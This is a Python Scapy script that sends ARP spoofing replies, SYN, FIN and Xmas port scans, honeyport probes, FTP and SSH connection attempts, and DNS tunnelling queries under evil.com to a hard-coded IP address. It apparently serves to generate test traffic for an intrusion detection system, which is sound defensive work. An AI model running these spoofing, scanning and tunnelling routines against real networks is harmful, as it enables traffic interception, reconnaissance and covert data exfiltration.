from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.l2 import Ether, ARP
from scapy.layers.dns import DNS, DNSQR
from scapy.sendrecv import send, sendp
import base64
import os
import warnings

# Suppress the iface warning — we're sending to loopback so iface has no effect
warnings.filterwarnings("ignore", message=".*iface.*has no effect.*")

DST_IP  = "129.21.102.104"
SRC_IP  = "192.168.1.2"
SRC_MAC = "56:1A:7D:3F:4B:6C"
DST_MAC = "41:1A:7D:3F:4B:6C"

IFACE = "Wi-Fi"

def send_packet(protocol, dst_ip, src_ip=None, src_port=None, dst_port=None,
                flags=None, payload=None, num_packets=1):
    eth = Ether(src=SRC_MAC, dst=DST_MAC)
    ip  = IP(src=src_ip or SRC_IP, dst=dst_ip)

    if protocol == "TCP":
        l4 = TCP(sport=src_port or 1024, dport=dst_port or 80, flags=flags or "S")
        pkt = eth/ip/l4
        if payload:
            pkt = pkt/(payload.encode() if isinstance(payload, str) else payload)
    elif protocol == "UDP":
        pkt = eth/ip/UDP(sport=src_port or 1024, dport=dst_port or 53)
        if payload: pkt = pkt/payload
    elif protocol == "DNS":
        pkt = eth/ip/UDP(sport=src_port or 12345, dport=53)/DNS(rd=1, qd=DNSQR(qname=payload))
    elif protocol == "ICMP":
        pkt = eth/ip/ICMP()
    
    sendp([pkt]*num_packets, iface=IFACE, verbose=False)


def make_tunnel_domain(base_domain="evil.com"):
    raw     = os.urandom(100)
    encoded = base64.b32encode(raw).decode().rstrip("=").lower()
    labels  = [encoded[i:i + 30] for i in range(0, len(encoded), 30)]
    return (".".join(labels) + "." + base_domain).encode()


def send_dns(num_packets=1):
    for _ in range(num_packets):
        payload = make_tunnel_domain()
        send_packet("DNS", DST_IP, SRC_IP, 12345, 53, payload=payload)


def send_ftp(num_packets=1):
    for _ in range(num_packets):
        send_packet("TCP", DST_IP, SRC_IP, 12345, 21,
                    flags="PA", payload="USER admin\r\n")
        send_packet("TCP", DST_IP, SRC_IP, 21, 12345,
                    flags="PA", payload="220 FTP server ready\r\n")


def send_brute_force(dst_port=22, num_attempts=20):
    for i in range(num_attempts):
        send_packet("TCP", DST_IP, SRC_IP,
                    src_port=10000 + i,
                    dst_port=dst_port,
                    flags="S")


def send_icmp_sweep(targets: list[str], num_packets=1):
    for target in targets:
        send_packet("ICMP", target, SRC_IP, num_packets=num_packets)


def send_port_scan(dst_ports: list[int], flags="S"):
    for port in dst_ports:
        send_packet("TCP", DST_IP, SRC_IP,
                    src_port=54321,
                    dst_port=port,
                    flags=flags)
        
def send_arp(target_ip, spoof_ip, spoof_mac, num_packets=1):
    arp = ARP(
        op=2,
        pdst=target_ip,
        hwdst="ff:ff:ff:ff:ff:ff",
        psrc=spoof_ip,
        hwsrc=spoof_mac,
    )
    eth = Ether(dst="ff:ff:ff:ff:ff:ff", src=SRC_MAC)
    sendp([eth / arp] * num_packets, iface="Wi-Fi", verbose=True)

def main():
    ports = []
    for num in range(30):
        ports.append(num)
    
    # ARP Spoof
    send_arp(DST_IP, SRC_IP, "aa:bb:cc:dd:ee:ff", 1) # Initialize ARP
    send_arp(DST_IP, SRC_IP, "bb:bb:cc:dd:ee:ff", 1) # Change ARP
    
    # Honeyport
    send_packet("TCP", DST_IP, SRC_IP, 9999, 21, None, None, 1)  # FTP honeyport
    send_packet("TCP", DST_IP, SRC_IP, 9999, 23, None, None, 1)  # Telnet honeyport (port 23!)
    
    # DNS Tunnel
    send_dns(10) # DNS Tunnel
    
    # SYN Scan
    send_port_scan(ports, "S") # SYN scan
    send_port_scan(ports, "F") # FIN scan
    send_port_scan(ports, "FPU") # FIN scan

main()